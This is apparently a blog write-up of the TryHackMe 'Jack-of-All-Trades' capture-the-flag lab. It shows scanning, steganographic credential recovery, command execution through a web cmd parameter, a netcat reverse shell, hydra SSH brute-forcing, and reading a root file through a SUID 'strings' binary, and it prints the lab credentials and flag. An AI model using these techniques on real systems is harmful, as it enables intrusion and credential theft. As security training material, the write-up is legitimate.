---
title: "TryHackMe - Jack-of-All-Trade"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - code execution
  - steganography
  - strings
---
Boot-to-root originally designed for Securi-Tay 2020

## Scanning
Scanning all ports.

```bash
$ rustscan -a 10.10.40.63 --ulimit 10000 -- -A -v -PS 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.40.63:22
Open 10.10.40.63:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 10:31 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
Initiating Ping Scan at 10:31
Scanning 10.10.40.63 [1 port]
Completed Ping Scan at 10:31, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:31
Completed Parallel DNS resolution of 1 host. at 10:31, 13.00s elapsed
DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 10:31
Scanning 10.10.40.63 [2 ports]
Discovered open port 80/tcp on 10.10.40.63
Discovered open port 22/tcp on 10.10.40.63
Completed Connect Scan at 10:31, 0.20s elapsed (2 total ports)
Initiating Service scan at 10:31
Scanning 2 services on 10.10.40.63
Completed Service scan at 10:31, 11.59s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.40.63.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
NSE Timing: About 99.64% done; ETC: 10:32 (0:00:00 remaining)
Completed NSE at 10:32, 31.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:32
Completed NSE at 10:32, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:32
Completed NSE at 10:32, 0.00s elapsed
Nmap scan report for 10.10.40.63
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-02-01 10:31:06 EST for 57s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANucPy+D67M/cKVTYaHYYpt9bqPviYbWW/4+BFnUOQoNordc9Pc+8CauJqNFiebIqpKYKXhpEAt82m1IjQh8EmWdJYcQnkMFgukM3/mGjngXTbUO8vAbi53Zy8wwOaBlmRK9mvfAYEWPkcjzRmYgSp51TgEtSGWIyAkc1Lx6YVtDAAAAFQCsIgZJlrsYvAtF7Rmho7lIdn0WOwAAAIEApri35SyOophhqX45JcDpVASe3CSs8tPMGoOc0I9ZtTGt5qyb1cl7N3tXsP6mlrw4d4YNo8ct0w6TjsxPcJjGitRQ+SILWHy72XZ5Chde6yewKB5BeBjXrYvRR1rW+Tpia5kyjB4s0mGB7o3FMjX/dT+ISqYvZeVa7mQnBo0f0XMAAACAP89Ag2kmcs0FBt7KCBieH3UB6gF+LdeRVJHio5p4VQ8cTY1NZDyWqudS1TJq1BAToJSz9MqwUwzlILjRjuGQtylpssWSRbHyM0aqmJdORSMOCMUiEwyfk6T8+Vmama/AN7/htZeWBjWVeVEnbYJJQ6kPSCvZodMdOggYXcv32CA=
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbCwl2kyYWpv1DPDF0xQ5szNR1muMph6gJMJFw9VubKkSvHMWfg7CaCNcyo1QR5dg9buIygIGab8e9aigJdjQUY4XeBejwGe+vAA8RtPMoiLclR6g5qAqVQSeZ2FBzMrmkyKIgsSDb8tP+czpzn/Gp1HzDtiYUvleTvO2xEZ3k2Xz8YDvPlkV4zAIPzZSSZ8BABPYsBrePIwMpr/ZjeeiE59DlkUIv8x8M0z9KOls9zaeqFsbWrfMZzFgtPP+KILN6GrGijxgcGq5mDwvr67oHL3T3FtpReE+UZ/CafmzO/2Ls8XstmUiNeMaNBYtc6703/84bpL0uLp/pkILS8eqX
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO4p2E6NglzDeP40tJ42LjWaVrOcINmy42cspAv8DSzGD0K+V3El/tyGBxCJlMMR7wbN0968CQl61x0AkkAHLFk=
|   256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6jYsDJq1mWTDx7D+p3mMbqXhu9OhhW2p1ickLCdZ9E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
Let check the HTTP service at port 22.

<a href="/assets/images/tryhackme/jack-of-all-trades/1.png"><img src="/assets/images/tryhackme/jack-of-all-trades/1.png"></a>

Let's check the source code.

<a href="/assets/images/tryhackme/jack-of-all-trades/2.png"><img src="/assets/images/tryhackme/jack-of-all-trades/2.png"></a>

Let's decode the text we got.

```bash
┌──(kali㉿kali)-[~]
└─$ echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

Let's visit the `/recovery.php` directory.

<a href="/assets/images/tryhackme/jack-of-all-trades/3.png"><img src="/assets/images/tryhackme/jack-of-all-trades/3.png"></a>

I tried login in with `jack:u?WtKSraq` but didn't work. Let's check the source code.

<a href="/assets/images/tryhackme/jack-of-all-trades/5.png"><img src="/assets/images/tryhackme/jack-of-all-trades/5.png"></a>

We got another long string but can't find the algorithm. Let's search for **Johny Graves** for the next clue.

<a href="/assets/images/tryhackme/jack-of-all-trades/4.png"><img src="/assets/images/tryhackme/jack-of-all-trades/4.png"></a>

We got his favourite crypto method. Let's decrypt the string we found earlier.

<a href="/assets/images/tryhackme/jack-of-all-trades/6.png"><img src="/assets/images/tryhackme/jack-of-all-trades/6.png"></a>

Let's open the link.

<a href="/assets/images/tryhackme/jack-of-all-trades/7.png"><img src="/assets/images/tryhackme/jack-of-all-trades/7.png"></a>

Stegosauira??? Hemm. I found a `dinosaurus` on the main page earlier. Let's download the photo and do some basic steganography!

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf stego.jpg                                                                                                                                       1 ⨯
Enter passphrase: 
wrote extracted data to "creds.txt".
```

We got `creds.txt` by using `u?WtKSraq` as the password. Let's `cat` the file.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat creds.txt  
Hehe. Gotcha!

You're on the right path, but wrong image!
``` 

Wrong image -_-. The real image is the one named `header.jpg`. Let's extract the creds and `cat` it out.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf header.jpg                                                                                                                                      1 ⨯
Enter passphrase: 
wrote extracted data to "cms.creds".
                                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

## Gaining access
Let's login using the creds we found to `/recovery.php`.

<a href="/assets/images/tryhackme/jack-of-all-trades/8.png"><img src="/assets/images/tryhackme/jack-of-all-trades/8.png"></a>

We must pass the `cmd` as the GET parameter. Code execution maybe? Let's find that out.

<a href="/assets/images/tryhackme/jack-of-all-trades/9.png"><img src="/assets/images/tryhackme/jack-of-all-trades/9.png"></a>

YES! Let's inject our reverse shell payload and wait for it with our `netcat` listener. I use python reverse shell one liner from [here](https://github.com/wuvel/fuzzdb/blob/master/attack-payloads/os-cmd-execution/reverse-shell-one-liners.doc.txt).

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.30.247] 39770
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Looking for interesting files.

```bash
www-data@jack-of-all-trades:/home$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 29  2020 .
drwxr-xr-x 23 root root 4096 Feb 29  2020 ..
drwxr-x---  3 jack jack 4096 Feb 29  2020 jack
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
www-data@jack-of-all-trades:/home$ cat jacks
cat jacks_password_list 
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Let's bruteforce jack's password using the list above.

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l jack -P jacks_password_list -t 16 -u ssh://10.10.30.247:80 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-01 11:08:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.30.247:80/
[80][ssh] host: 10.10.30.247   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-01 11:08:24
```

SSH with jack as the user.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh jack@10.10.30.247 -p 80                                                                                                                                        255 ⨯
The authenticity of host '[10.10.30.247]:80 ([10.10.30.247]:80)' can't be established.
ECDSA key fingerprint is SHA256:wABOsY4G6TIcuJ2bmAIpsoBGVR06p/QGP2J7tfiSy2s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.30.247]:80' (ECDSA) to the list of known hosts.
jack@10.10.30.247's password: 
jack@jack-of-all-trades:~$
```

Listing files.

```bash
jack@jack-of-all-trades:~$ ls
user.jpg
```

Let's use `scp` to download the file.

```bash
┌──(kali㉿kali)-[~]
└─$ scp -P 80 jack@10.10.30.247:user.jpg .                                                                                                                               1 ⨯
jack@10.10.30.247's password: 
user.jpg                                                                                                                                   100%  286KB 297.1KB/s   00:00    
```

user.jpg:

<a href="/assets/images/tryhackme/jack-of-all-trades/10.png"><img src="/assets/images/tryhackme/jack-of-all-trades/10.png"></a>

## Escalation
Running linpeas.

```bash
...
-rwsr-x--- 1 root   dev         27K Feb 25  2015 /usr/bin/strings
...
```

We got SUID at `strings`. I tried to crack the `shadow` file hash but didn't find any common password. So there is no escalation to root on this room :(. Anyway, let's `cat` the root.txt:

```bash
jack@jack-of-all-trades:/tmp$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
jack@jack-of-all-trades:/tmp$
```